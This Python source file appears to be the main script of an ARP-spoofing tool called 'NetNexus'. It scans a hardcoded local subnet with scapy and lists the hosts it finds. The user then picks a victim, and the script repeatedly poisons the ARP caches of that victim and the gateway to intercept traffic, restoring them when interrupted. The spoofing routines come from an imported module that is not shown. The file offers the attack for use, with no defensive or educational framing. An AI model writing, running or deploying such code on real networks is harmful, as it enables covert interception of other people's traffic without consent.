import scapy.all as scapy
import os
import time
import sys
from core import scanner, spoof

def main():
    # CONFIGURATION: Ensure this matches your 'ip a' output
    scapy.conf.iface = "wlan0" 
    
    if os.geteuid() != 0:
        print("[-] NetNexus requires root. Run with: sudo python main.py")
        return

    gateway_ip = "192.168.8.1"
    ip_range = "192.168.8.1/24"

    while True:
        print("\n" + "="*30)
        print("   NetNexus Discovery Menu")
        print("="*30)
        print(f"[*] Scanning {ip_range}... please wait.")
        
        devices = scanner.scan(ip_range)
        
        print("\nID\tIP Address\t\tMAC Address\t\tDevice Name")
        print("-" * 90)
        for index, device in enumerate(devices):
            print(f"{index}\t{device['ip']}\t\t{device['mac']}\t{device['name']}")
        
        print("-" * 90)
        print("[R] Refresh/Rescan Network")
        print("[C] Cancel and Exit")
        
        user_input = input("\nSelect Target ID or Option: ").lower().strip()

        # Handle Menu Options
        if user_input == 'c':
            print("[*] Exiting NetNexus.")
            sys.exit()
        elif user_input == 'r':
            print("[*] Refreshing...")
            continue
        
        # Handle Target Selection
        try:
            choice = int(user_input)
            target = devices[choice]
            target_ip = target['ip']
            target_mac = target['mac']

            print(f"[*] Resolving Gateway MAC...")
            gateway_mac, _ = spoof.get_device_info(gateway_ip)

            if not gateway_mac:
                print("[-] Error: Could not find Gateway. Try refreshing.")
                continue

            print(f"[*] Intercepting {target_ip} ({target['name']})...")
            packet_count = 0
            while True:
                spoof.spoof(target_ip, gateway_ip, target_mac, gateway_mac)
                packet_count += 2
                print(f"\r[+] Packets Sent: {packet_count} | Press Ctrl+C to stop", end="") 
                time.sleep(0.5)
                
        except (ValueError, IndexError):
            print("[-] Invalid selection. Please choose a valid ID, 'R', or 'C'.")
            time.sleep(1)
        except KeyboardInterrupt:
            print("\n\n[*] Stopping Attack... Restoring network.")
            spoof.restore(target_ip, gateway_ip)
            spoof.restore(gateway_ip, target_ip)
            print("[+] Network Restored. Returning to menu...")
            time.sleep(2)

if __name__ == "__main__":
    main()
